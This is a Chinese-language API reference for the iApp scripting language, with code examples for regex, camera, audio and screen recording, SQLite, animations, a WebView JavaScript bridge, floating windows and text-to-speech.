<p>【ufnsui 线程更新界面】<br>用法：<br>ufnsui()<br>{<br>tw(a)<br>us(1, “text”, “内容”)<br>}</p>
<p>说明：<br>线程中直接修改界面或修改设置控件属性，出错。<br>需要使用ufnsui模块进行更新或设置控件属性。</p>
<p>提示：<br>线程中获取控件数据不会出错。</p>
<p>【se 正则表达式操作】<br>用法：<br>//===========例子1；所有属性展示<br>//字符串<br>s a = “qqqq123456eee”<br>//正则表达式<br>s b = “([a-z]+)(\d+)”<br>//更多参数<br>s c = 0<br>se(a, b, c, d)</p>
<p>//替换成，将替换全部<br>se(d, “sral”, “1:$1, 2:$2”, e)<br>syso(e)<br>//替换成，只替换第一个<br>se(d, “srft”, “1:$1, 2:$2”, e)<br>syso(e)</p>
<p>//返回是否匹配成功，需字符串被完全匹配，赋值返回true或 false<br>.se(d, “ms”, e)</p>
<p>//开始匹配 或 匹配下一个，赋值返回true或 false<br>.se(d, “find”, e)</p>
<p>//给定位置序号进行匹配，赋值返回true或 false<br>.se(d, “find”, 1, e)</p>
<p>//获取匹配组的数量，当前为2组：([a-z]+)、(\d+)<br>.se(d, “gl”, e)</p>
<p>//获取第1组匹配到的子字符串在字符串中的开头位置<br>.se(d, “start”, 1, e)</p>
<p>//获取第1组匹配到的子字符串在字符串中的结尾位置<br>.se(d, “end”, 1, e)</p>
<p>//获取第1组匹配到的子字符串<br>.se(d, “group”, 1, e)<br>//获取第2组匹配到的子字符串<br>.se(d, “group”, 2, e)</p>
<p>//===========例子2；获取所有手机号</p>
<p>//字符串<br>s a = “我的号码 13612345678 , 你的号码 13412345678”<br>//正则表达式<br>s b = “[1][3-8]\d{9}”<br>//更多参数<br>s c = 0<br>se(a, b, c, d)</p>
<p>//开始匹配 或 匹配下一个<br>se(d, “find”, e)</p>
<p>//循环判断是否匹配成功<br>w(e == true)<br>{<br>//因为 [1][3-8]\d{9} 没有组，所以这里我们输入 0<br>se(d, “group”, 0, e)</p>
<p>//打印出匹配到的子字符串<br>syso(e)</p>
<p>//开始匹配 或 匹配下一个<br>se(d, “find”, e)<br>}</p>
<p>//===========例子3；判断是否为手机号</p>
<p>//字符串<br>s a = “13612345678”<br>//正则表达式<br>s b = “^[1][3-8]\d{9}$”<br>//更多参数<br>s c = 0<br>se(a, b, c, d)</p>
<p>se(d, “ms”, e)<br>f(e == true)<br>{<br>syso(“手机号格式正确”)<br>}<br>else<br>{<br>syso(“手机号格式错误”)<br>}</p>
<p>说明：<br>常用与字符串处理，高效的处理字符串，以及检测字符串类型等。使用此方法，需要对正则表达式有部分知识。</p>
<p>【usg 闪光灯操作】<br>用法：<br>//开启闪光灯<br>//输入闪光灯变量对象，输入是否开启闪光灯<br>usg(sss.sgd, true)</p>
<p>//关闭闪光灯<br>//输入闪光灯变量对象，输入是否开启闪光灯<br>usg(sss.sgd, false)</p>
<p>说明：<br>开启或关闭 设备闪光灯！</p>
<p>说明：<br>常用照明。</p>
<p>注意：<br>此方法调用将无法与摄像头同时调用。如启动摄像头需要使用闪光灯，可在摄像头操作中开启闪光灯。</p>
<p>【uzd 震动器操作】<br>用法：<br>//震动1秒时长<br>//输入振动器变量对象，输入震动时长<br>uzd(sss.zdq, 1000)</p>
<p>//静止1秒，震动1秒，静止1秒，震动1秒，静止1秒，震动1秒，静止1秒，..， 并且不重复<br>//输入振动器变量对象，输入震动规则，输入是否重复循环执行<br>uzd(sss.zdq, “1000 1000 1000 1000 1000 1000 1000 1000”, false)</p>
<p>//强制停止震动器<br>uzd(sss.zdq, “sp”)</p>
<p>//检查硬件是否具有振动器<br>uzd(sss.zdq, “ip”, b)<br>syso(b)</p>
<p>说明：<br>常用提示用户。</p>
<p>【usxq 开启前置摄像头】<br>用法：<br>//开启摄像头<br>//输入摄像头变量对象，输入面控件的对象或ID，摄像头旋转角度<br>usxq(sss.ps, 1, 90)</p>
<p>//输入摄像头变量对象，输入面控件的对象或ID，摄像头旋转角度，输入拍摄宽度像素，输入拍摄高度像素，输入图像品质1-100<br>usxq(sss.ps, 1, 90, 640, 480, 95)</p>
<p>//自动对焦拍摄<br>//输入摄像头变量对象，输入保存路径，输入图像旋转角度，输入拍摄是否停止预览<br>usx(sss.ps, “shot”, “%abc.jpg”, -90, false)</p>
<p>说明：<br>指定打开前置摄像头。</p>
<p>注意：<br>此功能需要与一个面控件进行绑定，你可以在面控件上面设置拍摄事件。</p>
<p>注意：<br>此代码仅限于载入事件调用。</p>
<p>【usxh 开启后置摄像头】<br>用法：<br>//开启摄像头<br>//输入摄像头变量对象，输入面控件的对象或ID，摄像头旋转角度<br>usxh(sss.ps, 1, 90)</p>
<p>//输入摄像头变量对象，输入面控件的对象或ID，摄像头旋转角度，输入拍摄宽度像素，输入拍摄高度像素，输入图像品质1-100<br>usxh(sss.ps, 1, 90, 1280, 960, 95)</p>
<p>//自动对焦拍摄<br>//输入摄像头变量对象，输入保存路径，输入图像旋转角度，输入拍摄是否停止预览<br>usx(sss.ps, “shot”, “%abc.jpg”, 90, false)</p>
<p>说明：<br>指定打开后置摄像头。</p>
<p>注意：<br>此功能需要与一个面控件进行绑定，你可以在面控件上面设置拍摄事件。</p>
<p>注意：<br>此代码仅限于载入事件调用。</p>
<p>【usx 摄像头操作】<br>用法：<br>//开启摄像头<br>usxh(sss.ps, 1, 90)</p>
<p>//自动对焦拍摄<br>//输入摄像头变量对象，输入保存路径，输入图像旋转角度，输入拍摄是否停止预览<br>usx(sss.ps, “shot”, “%abc.jpg”, 90, false)</p>
<p>//开始预览<br>usx(sss.ps, “st”)</p>
<p>//停止预览<br>usx(sss.ps, “sp”)</p>
<p>//旋转摄像头角度<br>usx(sss.ps, “rotaing”, 180)<br>//获取旋转摄像头角度<br>usx(sss.ps, “getrotaing”, b)<br>syso(b)</p>
<p>//启动摄像头闪光灯<br>usx(sss.ps, “usg”, true)</p>
<p>//结束摄像头组件变量对象<br>usx(sss.ps, “re”)</p>
<p>说明：<br>摄像头的控制。</p>
<p>【bly 录制音频】<br>用法：<br>//开始录制<br>//输入录音变量对象，输入保存文件路径<br>bly(sss.ly, “%abcd.amr”)</p>
<p>//停止录音<br>bly(sss.ly, “sp”)</p>
<p>说明：<br>常用于录制音频。</p>
<p>说明：<br>可使用 bfm 代码来播放录制好的音频。</p>
<p>【ujp 截取屏幕】<br>用法：<br>//输入保存路径，输入图像品质（1-100）<br>ujp(“%123.jpg”, 70)</p>
<p>说明：<br>常用于截取当前界面。</p>
<p>【sqlite 数据库操作】<br>用法：<br>//连接一个私有数据库，如果不存在将自动新建<br>//输入数据库对象变量，输入数据库文件名<br>sqlite(sss.data, “iapp.db”)</p>
<p>//连接一个公共数据库，如果不存在将自动新建<br>//输入数据库对象变量，输入数据库文件名<br>sqlite(sss.data, “%iapp.db”)</p>
<p>//判断数据库是否存在<br>sqlite(“iapp.db”, “ip”, b)<br>syso(b)</p>
<p>//删除数据库<br>sqlite(“iapp.db”, “del”, b)<br>syso(b)</p>
<p>//释放数据库<br>sqlite(sss.data, “re”)</p>
<p>说明：<br>进行数据库的操作。</p>
<p>【sql 数据表操作】<br>用法：</p>
<p>//创建数据表<br>s table = “_id integer primary key,url text, filename text,status interger,createTime datetime”<br>sql(sss.data, “info”, “add”, table, b)</p>
<p>//判断数据表是否存在<br>sql(sss.data, “info”, “ip”, b)<br>syso(b)</p>
<p>//删除数据表<br>sql(sss.data, “info”, “del”, b)<br>syso(b)</p>
<p>//添加数据表一条数据<br>s table = “url,filename,status,createTime”<br>time(0, sj)<br>ss(“‘<a href="http://abc.com/abc.apk&#39;">http://abc.com/abc.apk&#39;</a>, ‘abc.apk’, 1, ‘“ + sj + “‘“, data)<br>sql(sss.data, “info”, “add”, table, data, b)<br>syso(b)</p>
<p>//修改数据表的数据，若不需要设置条件(status=2)可设为 null 视为适用于执行所以数据<br>sql(sss.data, “info”, “up”, “status=2”, “_id=1”, b)<br>syso(b)</p>
<p>//删除数据表的数据，若不需要设置条件(_id=1)可设为 null 视为适用于执行所以数据<br>sql(sss.data, “info”, “del”, “_id=1”, b)<br>syso(b)</p>
<p>//查询，若不需要设置条件(status=1 order by _id desc LIMIT 0,1)可设为 null 视为适用于执行所以数据</p>
<p>// LIMIT &lt;跳过的数据数目&gt;, &lt;取数据数目&gt;<br>s table = “_id,url,filename,status,createTime”<br>s sqlx = “status=1 order by _id desc LIMIT 0,1”<br>sql(sss.data, “info”, “sele”, table, sqlx, data)</p>
<p>//自定义sql查询<br>//s sqlx = “select _id,url,filename,status,createTime from info where status=1 order by _id desc LIMIT 0,1”<br>//sql(sss.data, sqlx, data)</p>
<p>//光标对象移到下一条数据<br>sqlsele(data, “next”, e)<br>w(e == true)<br>{<br>//获取光标对象的第一列数据<br>sqlsele(data, 0, e)<br>syso(e)</p>
<p>//获取光标对象的第二列数据<br>sqlsele(data, 1, e)<br>syso(e)</p>
<p>//光标对象移到下一条数据<br>sqlsele(data, “next”, e)<br>}</p>
<p>//自定义的sql执行，需要对sql语法了解才能灵活运用<br>s sqlx = “insert into info (url,filename,status,createTime) values (‘<a href="http://abc.com/abc.apk&#39;">http://abc.com/abc.apk&#39;</a>, ‘abc.apk’, 1, ‘2016-7-31 10:31:21’)”<br>sql(sss.data, sqlx)</p>
<p>说明：<br>数据表的操作。</p>
<p>注意：<br>在执行sql语句的时候，需要注意你的字符串的特殊字符的转义。<br>     /   -&gt;    //<br>     ‘   -&gt;    ‘’<br>     [   -&gt;    /[<br>     ]   -&gt;    /]<br>     %   -&gt;    /%<br>     &amp;   -&gt;    /&amp;<br>     _   -&gt;    /_<br>     (   -&gt;    /(<br>     )   -&gt;    /)</p>
<p>【sqlsele 查询数据操作】<br>用法：</p>
<p>//获取光标对象的第一列数据<br>sqlsele(data, 0, e)</p>
<p>//获取光标对象有多少列<br>sqlsele(data, “columncount”, e)<br>syso(e)</p>
<p>//获取总共查询到多少条数据<br>sqlsele(data, “count”, e)<br>syso(e)</p>
<p>//光标对象移到下一条数据<br>sqlsele(data, “next”, e)</p>
<p>//光标对象移到上一条数据<br>sqlsele(data, “previous”, e)</p>
<p>//光标对象移到第一条数据<br>sqlsele(data, “first”, e)</p>
<p>//光标对象移到最后第一条数据<br>sqlsele(data, “last”, e)</p>
<p>//光标对象移到指定第2条数据<br>sqlsele(data, “position”, 2)</p>
<p>//获取光标对象当前位置<br>sqlsele(data, “getposition”, e)<br>syso(e)</p>
<p>//释放数据查询<br>sqlite(data, “re”)</p>
<p>说明：<br>数据查询的操作。</p>
<p>【dha 渐变透明度动画】<br>用法：<br>//创建一个渐变透明度动画，开始显示，然后渐变消失<br>//输入动画开始是否透明，输入动画结束是否透明<br>dha(dh, true, false)<br>dh(dh, “duration”, 2000)<br>us(2, “dh”, dh)</p>
<p>说明：<br>常用于控件透明度动画。</p>
<p>【dhs 渐变尺寸伸缩动画】<br>用法：<br>//创建一个渐变尺寸伸缩动画<br>//0为没有，2.5为原始2.5倍</p>
<p>//输入X开始尺寸比例，输入X结束尺寸比例，输入Y开始尺寸比例，输入Y结束尺寸比例<br>dhs(dh, 0.5, 2.5, 0.5, 2.5)<br>dh(dh, “duration”, 2000)<br>us(2, “dh”, dh)</p>
<p>//输入X开始尺寸比例，输入X结束尺寸比例，输入Y开始尺寸比例，输入Y结束尺寸比例，输入X位置类型，输入X坐标的开始位置，输入Y位置类型，输入Y坐标的开始位置<br>dhs(dh, 0.5, 2.5, 0.5, 2.5, 1, 0.5, 1, 0.5)<br>dh(dh, “duration”, 2000)<br>us(2, “dh”, dh)</p>
<p>说明：<br>常用于控件伸缩动画。</p>
<p>位置类型：<br>0 默认<br>1 以对象本身为基准位置类型<br>2 以父控件为基准位置类型</p>
<p>【dht 画面位置移动动画】<br>用法：<br>//创建一个画面位置移动动画<br>//输入开始X坐标上的移动位置，结束X坐标上的移动位置，开始Y坐标上的移动位置，结束Y坐标上的移动位置<br>dht(dh, 30, 80, 30, 80)<br>dh(dh, “duration”, 2000)<br>us(2, “dh”, dh)</p>
<p>说明：<br>常用于控件移动动画。</p>
<p>【dhr 画面旋转动画】<br>用法：<br>//创建一个画面旋转动画<br>//输入动画开始的旋转角度，输入动画旋转到的角度<br>dhr(dh, 0, 180)<br>dh(dh, “duration”, 2000)<br>us(2, “dh”, dh)</p>
<p>//输入动画开始的旋转角度，输入动画旋转到的角度，输入X位置类型，输入X坐标的开始位置，输入Y位置类型，输入Y坐标的开始位置<br>dhr(dh, 0, 180, 1, 0.5, 1, 0.5)<br>dh(dh, “duration”, 2000)<br>us(2, “dh”, dh)</p>
<p>说明：<br>常用于控件旋转动画。</p>
<p>位置类型：<br>0 默认<br>1 以对象本身为基准位置类型<br>2 以父控件为基准位置类型</p>
<p>【dhset 动画集合】<br>用法：</p>
<p>//渐变尺寸伸缩动画<br>dhs(dh1, 0.5, 2.5, 0.5, 2.5)<br>dh(dh1, “duration”, 2000)</p>
<p>//画面位置移动动画<br>dht(dh2, 30, 80, 30, 80)<br>dh(dh2, “duration”, 2000)</p>
<p>//画面旋转动画<br>dhr(dh3, 0, 180)<br>dh(dh3, “duration”, 2000)</p>
<p>//创建一个动画集合<br>//输入动画集合变量对象，输入是否使用动画集合的interpolator，输入动画…（可输入N个参数）<br>dhset(dhlist, false, dh1, dh2, dh3, dh4)<br>us(2, “dh”, dhlist)</p>
<p>说明：<br>常用于动画集合执行。</p>
<p>提示：<br>动画集合允许被其他动画集合添加成为子动画。</p>
<p>提示：<br>动画集合如果设置了动画控制属性，同时也会重置所有子控件的属性。</p>
<p>【dhas 队列动画执行】<br>用法：<br>//旋转动画<br>//输入动画变量对象，输入控件ID或控件对象，输入动画类型，输入旋转角度…（可输入N个参数）<br>dhas(dh, 2, “rotation”, 60, 180)<br>//dhas(dh, 2, “rotationX”, 30, 80, 60, 20, 60)<br>//dhas(dh, 2, “rotationY”, 30, 80)<br>dh(dh, “duration”, 2000)<br>dh(dh, “start”)</p>
<p>//伸缩动画<br>//输入动画变量对象，输入控件ID或控件对象，输入动画类型，输入伸缩尺寸比例…（可输入N个参数）<br>dhas(dh, 2, “scaleX”, 1.5, 2.5)<br>//dhas(dh, 2, “scaleY”, 1.5, 2.5, 1.2, 2.6, 1.3)<br>dh(dh, “duration”, 2000)<br>dh(dh, “start”)</p>
<p>//移动动画<br>//输入动画变量对象，输入控件ID或控件对象，输入动画类型，输入移动到位置…（可输入N个参数）<br>dhas(dh, 2, “translationX”, 0, 60)<br>//dhas(dh, 2, “translationY”, 0, 60, 30, 10, 60)<br>dh(dh, “duration”, 2000)<br>dh(dh, “start”)</p>
<p>//透明度<br>//输入动画变量对象，输入控件ID或控件对象，输入动画类型，可见度比例(0.0至1.0)…（可输入N个参数）<br>dhas(dh, 2, “alpha”, 1, 0.3, 1, 0.2, 1)<br>dh(dh, “duration”, 2000)<br>dh(dh, “start”)</p>
<p>说明：<br>自定义队列动画执行。</p>
<p>【dhast 队列动画集合】<br>用法：</p>
<p>//旋转动画<br>dhas(dh1, 2, “rotation”, 60, 180)<br>dh(dh1, “duration”, 2000)</p>
<p>//伸缩动画<br>dhas(dh2, 2, “scaleX”, 1.5, 2.5)<br>dh(dh2, “duration”, 2000)</p>
<p>//移动动画<br>dhas(dh3, 2, “translationX”, 0, 60)<br>dh(dh3, “duration”, 2000)</p>
<p>//透明度<br>dhas(dh4, 2, “alpha”, 1, 0.3, 1, 0.2, 1)<br>dh(dh4, “duration”, 2000)</p>
<p>//顺序执行<br>dhast(dhlist, “sequen”, dh1, dh2, dh3, dh4)</p>
<p>//同时执行<br>//dhast(dhlist, “together”, dh1, dh2, dh3, dh4)<br>dh(dhlist, “start”)</p>
<p>说明：<br>常用于动画集合执行。</p>
<p>提示：<br>队列动画集合允许被其他队列动画集合添加成为子动画。</p>
<p>提示：<br>动画集合如果设置了动画控制属性，同时也会重置所有子控件的属性。</p>
<p>【dh 动画控制】<br>用法：</p>
<p>//========动画的属性（非队列动画）设置========================</p>
<p>//取消动画，取消后若需要重新播放，需要先执行 reset 然后再执行 start 进行播放<br>dh(dh, “cancel”)</p>
<p>//重置动画属性<br>dh(dh, “reset”)</p>
<p>//启动动画<br>dh(dh, “start”)</p>
<p>//动画持续时长<br>dh(dh, “duration”, 2000)</p>
<p>//延迟执行，延迟指定时长后才执行动画<br>dh(dh, “delay”, 2000)</p>
<p>//启动动画结束填充效果（如果设false 那么 after 与 before将无效）<br>dh(dh, “enabled”, true)</p>
<p>//动画执行后，控件停留执行结束状态<br>dh(dh, “after”, true)</p>
<p>//动画执行后，控件停留执行开始状态<br>dh(dh, “before”, true)</p>
<p>//动画重复执行的次数<br>dh(dh, “repeat”, 20)</p>
<p>dhas(dh2, 2, “rotation”, 60, 180)<br>//动画集合添加动画，仅用于 dhset 动画集合追加更多的动画<br>dh(dh, “add”, dh2)</p>
<p>//========队列动画的属性设置========================</p>
<p>//取消动画<br>dh(dh, “cancel”)</p>
<p>//播放动画<br>dh(dh, “start”)</p>
<p>//动画持续时长<br>dh(dh, “duration”, 2000)</p>
<p>//延迟执行，延迟指定时长后才执行动画<br>dh(dh, “delay”, 2000)</p>
<p>//动画是否正在运行<br>dh(dh, “running”, b)<br>syso(b)</p>
<p>//设置动画执行的控件ID或控件对象<br>dh(dh, “target”, 2)</p>
<p>//克隆动画<br>dh(dh, “clone”, dh2)</p>
<p>说明：<br>常用于动画的控制管理。</p>
<p>【dhon 动画监听事件】<br>用法：<br>//========动画（非队列动画）设置监听事件========================<br>dhon(dh)<br>{<br>//当结束动画时<br>syso(“End”)<br>}</p>
<p>//或</p>
<p>dhon(dh)<br>{<br>//当结束动画时<br>syso(“End”)<br>}<br>else<br>{<br>//当重复动画时<br>syso(“Repeat”)<br>}<br>else<br>{<br>//当启动动画时<br>syso(“Start”)<br>}</p>
<p>//========队列动画设置监听事件========================</p>
<p>dhon(dh)<br>{<br>//当结束动画时<br>syso(“End”)<br>}</p>
<p>//或</p>
<p>dhon(dh)<br>{<br>//当结束动画时<br>syso(“End”)<br>}<br>else<br>{<br>//当重复动画时<br>syso(“Repeat”)<br>}<br>else<br>{<br>//当启动动画时<br>syso(“Start”)<br>}<br>else<br>{<br>//当取消动画时<br>syso(“Cancel”)<br>}</p>
<p>说明：<br>常用于动画状态的监听。</p>
<p>提示：<br>该事件使用的选择性，可顺序选择性保留。</p>
<p>【dhb 动画背景】<br>用法：<br>//创建动画背景<br>//输入动画背景变量对象，输入是否重复执行<br>dhb(dh, true)</p>
<p>//添加元素<br>//输入动画背景变量对象，输入背景图像或图片变量或背景对象，输入显示时长<br>dhb(dh, “@t1.png”, 1000)<br>dhb(dh, “@t2.png”, 1000)<br>dhb(dh, “@t3.png”, 1000)</p>
<p>//设为指定控件背景<br>us(2, “background”, dh)</p>
<p>//启动动画<br>dhb(dh, “start”)</p>
<p>//停止动画<br>//dhb(dh, “stop”)</p>
<p>//是否在运行<br>dhb(dh, “running”, b)<br>syso(b)</p>
<p>说明：<br>常用于组合一个背景动画。</p>
<p>【hsas 开启浏览器控件交互(裕语言+js+html5)】<br>用法：<br>//开启浏览器控件支持iapp交互<br>//输入浏览器控件ID或对象，输入是否开启<br>hsas(1, true)</p>
<p>//hsas(1, false)</p>
<p>说明：<br>常用于浏览器中的JavaScript代码于iapp代码的互相调用。</p>
<p>【has 裕语言交互JavaScript语言】<br>用法：<br>//首先将 web.html 放入用户文件中</p>
<p>//设置浏览器控件显示的html内容<br>s a = “@web.html”<br>s b = “utf-8”<br>fr(a, b, c)</p>
<p>s d = “utf-8”<br>s e = “text/html”<br>us(1, “url”, c, d, e, f)</p>
<p>//因为浏览器加载内容属于异步操作，如果立刻执行下面的代码会执行失败<br>//所以将下面的代码放入某项单击事件中</p>
<p>s a = “go(‘呀！’)”<br>//输入浏览器控件ID或对象，输入JavaScript的方法<br>has(1, a)</p>
<p>//带返回值解决方案<br>//s a = “go2(‘呀！’)”<br>//输入浏览器控件ID或对象，输入JavaScript的方法<br>//has(1, a)<br>//tw(sss.sb)</p>
<p>说明：<br>常用于浏览器中的JavaScript代码于iapp代码的互相调用。</p>
<p>注意：<br>在载入事件设置浏览器控件的加载html内容，它不会立刻加载完成。所以如果将 裕语言交互js的代码也写在载入事件，会导致交互调用失败。必须等待浏览器加载完毕html内容后，才能交互。</p>
<p>注意：<br>建议尽量使用JavaScript调用交互裕语言，效率较高。裕语言调用执行JavaScript的方法效率要慢数倍。</p>
<p>注意：<br>has 不应该放在新线程中，测试发现5.1系统has放入新线程中报错。</p>
<p>注意：<br>本例子需要注意编码，否则将乱码。</p>
<p>html（web.html）文件（utf-8编码）例子：</p>
<html>
<head>
<script type="text/javascript">
function go(o)
{
document.getElementById("sb").innerHTML += "打我" + o;
}
function go2(o)
{
document.getElementById("sb").innerHTML += "打我" + o;
iapp.s("sss.sb", document.getElementById("sb").innerHTML);
}
</script>
</head>
<p id="sb">哈哈，你来</p>
</html>


<p>【JavaScript交互裕语言】<br>用法：<br>//首先将 web.html 放入用户文件中</p>
<p>//设置浏览器控件显示的html内容<br>s a = “@web.html”<br>s b = “utf-8”<br>fr(a, b, c)</p>
<p>s d = “utf-8”<br>s e = “text/html”<br>us(1, “url”, c, d, e, f)</p>
<p>//此方法，主要是在JavaScript中写交互代码哦<br>//JavaScript中交互方法列表（用于交互裕语言）：</p>
<p>/.</p>
<p>//调用裕语言模块方法，不带返回变量的<br>iapp.fn(‘a.b(“‘ + o + ‘“)’);</p>
<p>//调用裕语言模块方法，带返回变量的<br>var value = iapp.fn2(‘a.c(“‘ + o + ‘“)’, b);</p>
<p>//设置裕语言变量数据<br>iapp.s(o);</p>
<p>//获取裕语言变量数据<br>var value = iapp.g(o);<br>./<br>说明：<br>常用于浏览器中的JavaScript代码于iapp代码的互相调用。</p>
<p>注意：<br>建议尽量使用JavaScript调用交互裕语言，效率较高。裕语言调用执行JavaScript的方法效率要慢数倍。</p>
<p>注意：<br>本例子需要注意编码，否则将乱码。</p>
<p>html（web.html）文件（utf-8编码）例子：</p>
<html>
<head>
<script type="text/javascript">

<p>//不带返回变量的<br>function go(o)<br>{<br>//调用的是 模块a.myu 中的 b方法<br>iapp.fn(‘a.b(“‘ + o + ‘“)’);<br>}</p>
<p>//带返回变量的<br>//执行模块后，获取一个变量并返回到javascript方法里<br>function go2(o, b)<br>{<br>//调用的是 模块a.myu 中的 c方法<br>var value = iapp.fn2(‘a.c(“‘ + o + ‘“)’, b);<br>alert(‘变量 sss.abc：’ + value);<br>}</p>
<p>//设置全局变量数据<br>//同理，下面也有设置界面变量、设置局部变量的例子<br>function ss(o, b)<br>{<br>iapp.s(o, b);<br>}</p>
<p>//获取全局变量数据<br>//同理，下面也有获取界面变量、获取局部变量的例子<br>function gs(o)<br>{<br>var value = iapp.g(o);<br>alert(‘变量 sss.abc：’ + value);<br>}</p>
<p></script></p>
</head>
<p><a href="javascript:void(0)" onclick="go('呵呵')">调用裕语言的模块方法</a></p>
<p></p>
<p></p>
<p><a href="javascript:void(0)" onclick="go2('呵呵', 'sss.abc')">调用裕语言的模块方法，并返回sss.abc变量内容</a></p>
<p></p>
<p></p>
<p><a href="javascript:void(0)" onclick="ss('sss.abc', '呵呵')">设置裕语言的sss.abc全局变量数据</a></p>
<p></p>
<p></p>
<p><a href="javascript:void(0)" onclick="gs('sss.abc')">获取裕语言的sss.abc全局变量数据</a></p>
</html>

<p>模块（a.myu）例子：<br>fn b(a)<br>//打印出数据<br>syso(a)<br>end fn</p>
<p>fn c(a)<br>//打印出数据<br>syso(a)<br>sss abc = “666呵呵”<br>end fn</p>
<p>【uxf 显示悬浮窗】<br>用法：</p>
<p>//输入界面名，输入宽度，输入高度，输入对其方式，输入赋值变量<br>s w = -1<br>s h = -1<br>s gravity = “top|right”<br>uxf(“a.iyu”, w, h, gravity, sss.v)</p>
<p>//输入界面名，输入X显示位置，输入Y显示位置，输入宽度，输入高度，输入类型的窗口，输入对其方式，输入flags，输入format，输入赋值变量<br>s x = 0<br>s y = 0<br>s w = -1<br>s h = -1<br>s type = 0<br>s gravity = “top|right”<br>s flags = 0<br>s format = 0<br>uxf(“a.iyu”, x, y, w, h, type, gravity, flags, format, sss.v)</p>
<p>//刷新悬浮窗口的布局，常用于通过us设置后的刷新<br>//输入界面根控件的控件对象<br>uxf(sss.v)</p>
<p>//移除悬浮窗口<br>//输入界面根控件的控件对象，输入标识<br>uxf(sss.v, “del”)</p>
<p>//重置悬浮窗的属性<br>//输入界面根控件的控件对象，输入标识，输入X显示位置，输入Y显示位置，输入宽度，输入高度，输入对其方式<br>s x = 0<br>s y = 0<br>s w = -2<br>s h = -2<br>s gravity = “top|right”<br>uxf(sss.v, “set”, x, y, w, h, gravity)</p>
<p>//重置悬浮窗的属性<br>//输入界面根控件的控件对象，输入标识，输入X显示位置，输入Y显示位置，输入宽度，输入高度，输入对其方式<br>s x = 0<br>s y = 0<br>s w = -1<br>s h = -1<br>s type = 0<br>s gravity = “top|right”<br>s flags = 0<br>s format = 0<br>uxf(sss.v, “set”, x, y, w, h, type, gravity, flags, format)</p>
<p>说明：<br>常用于显示悬浮窗窗口。</p>
<p>提示：<br>可通过 gvs(sss.v, a.1, b) 代码进行获取悬浮窗内的子控件，然后对其进行操作。</p>
<p>提示：<br>可通过下例代码，控制窗口位置的移动<br>//更新窗口位置<br>us(sss.v, “x”, 100)<br>us(sss.v, “y”, 100)</p>
<p>//获取窗口位置<br>ug(sss.v, “x”, xx)<br>ug(sss.v, “y”, yy)</p>
<p>//通过us 更新后， 需要刷新悬浮窗口的布局<br>uxf(sss.v)</p>
<p>对齐方式：<br>center：居中<br>top：顶<br>bottom：底<br>left：左<br>right：右<br>center_vertical：垂直居中<br>center_horizontal：水平居中</p>
<p>输入flags：<br>0 不许获得焦点（编辑框输入法将无法弹出）<br>1 可以获得焦点，返回键将不可用</p>
<p>【tts 文本转换语音】<br>用法：<br>//创建一个TTS对象<br>//输入赋值对象<br>tts(a)</p>
<p>//创建一个TTS对象；并且直接设置播放<br>//输入赋值对象，输入语言代码，输入语速率，输入音高率，输入播放文字（可传入null）<br>tts(a, “en”, “I love you”, 1, 1)</p>
<p>//获取TTS对象初始化状态；赋值变量返回 0未完成初始化 1初始化成功 -1初始化失败 -2初始化语言失败 -3当前TTS对象不可用<br>//输入TTS对象，输入标识，输入赋值变量<br>tts(a, “zt”, b)<br>syso(b)</p>
<p>//播放文字；模式 0替换以前的任务 1队列追加至后面<br>//输入TTS对象，输入标识，输入播放文字，输入模式，输入赋值变量<br>tts(a, “st”, “I love you”, 0, b)<br>syso(b)</p>
<p>//文字转换音频文件<br>//输入TTS对象，输入标识，输入文字，输入保存路径，输入赋值变量<br>tts(a, “ft”, “I love you”, “123.wav”, b)<br>syso(b)</p>
<p>//设置语言<br>//输入TTS对象，输入标识，输入语言代码<br>tts(a, “lg”, “en”)</p>
<p>//设置语音播放速率。1为正常，值越低语速越慢（0.5是正常的一半），值越大语速越快（2是正常的两倍）<br>//输入TTS对象，输入标识，输入小数<br>tts(a, “se”, 1)</p>
<p>//设置音高率，值越大声音越高音，值越小声音越低音，正常为1.0<br>//输入TTS对象，输入标识，输入小数<br>tts(a, “ph”, 1)</p>
<p>//检查是否TTS正在播放<br>//输入TTS对象，输入标识<br>tts(a, “ip”, b)<br>syso(b)</p>
<p>//释放TTS使用的资源<br>//输入TTS对象，输入标识<br>tts(a, “re”)</p>
<p>//停止所有任务<br>//输入TTS对象，输入标识，输入赋值变量<br>tts(a, “sp”, b)<br>syso(b)</p>
<p>//检查是否一个可用的TTS对象<br>//输入TTS对象，输入标识，输入赋值变量<br>tts(a, “is”, b)<br>syso(b)</p>
<p>说明：<br>常用于文本转化为音频，并且播放。</p>
<p>语言代码：</p>
<ul>
<li><p>系统默认支持语言<br>美国    en<br>德国    de<br>意大利  it<br>法国    fr</p>
</li>
<li><p>需安装第三方语言包（讯飞语音TTS），并且设置语言<br>日本    ja<br>韩国    ko<br>中国    zh</p>
</li>
</ul>
<p>安装与设置中文语言：</p>
<p>下载其中一个<br>(4.0系统)讯飞语音TTS <a href="http://m.yx93.com/app.aspx?id=28515">http://m.yx93.com/app.aspx?id=28515</a><br>(2.2系统)讯飞语音TTS <a href="http://m.yx93.com/app.aspx?id=28513">http://m.yx93.com/app.aspx?id=28513</a></p>
<p>安装 讯飞语音TTS</p>
<p>安卓手机》设置》语言和输入法》文本转语音输入》选择 讯飞语音合成 ,默认引擎 讯飞语音合成 , 语言 中文<br>（设置因为各品牌细节不同，但是都大同小异）</p>
<p>注意事项：<br>单独TTS对象创建后，需要有一个异步初始化过程，如果创建TTS对象然后直接播放文本将无法成功。需要先完成初始化后，然后播放文本。</p>
<p>注意事项：<br>文字转语音TTS输出；默认语言状态：完全支持 中文</p>
<p>【blp 录制屏幕】<br>用法：<br>s b = “123.mp4”<br>//输入储存录制文件路径，输入视频宽度，输入视频高度，输入视频码率，输入视频帧率<br>blp(b, 1280, 720, 1024000, 30)</p>
<p>//开始录制<br>blp(“st”, b)<br>syso(b)</p>
<p>//停止录制<br>blp(“sp”, b)<br>syso(b)</p>
<p>//释放资源<br>blp(“re”, b)<br>syso(b)</p>
<p>//判断是否正在录制<br>blp(“ip”, b)<br>syso(b)</p>
<p>说明：<br>用于手机屏幕录制。</p>
<p>注意：<br>仅支持系统Android 5.0以及以上才有效果！<br>Android 5.0以下的系统，无效果！</p>
<p>【otob 转换为字节组】<br>用法：<br>//将文件转换为字节组，字节组将为字符串形式返回赋值给“b”<br>otob(“%abc.txt”, b)<br>syso(b)</p>
<p>//将字符串转换为字节组<br>otob(“utf-8”, “nihao”, b)<br>syso(b)<br>//不设置编码<br>otob(null, “nihao”, b)</p>
<p>//将文件转换成 byte[] 字节数组对象<br>otob(“file”, null, “%abc.txt”, b)<br>syso(b)</p>
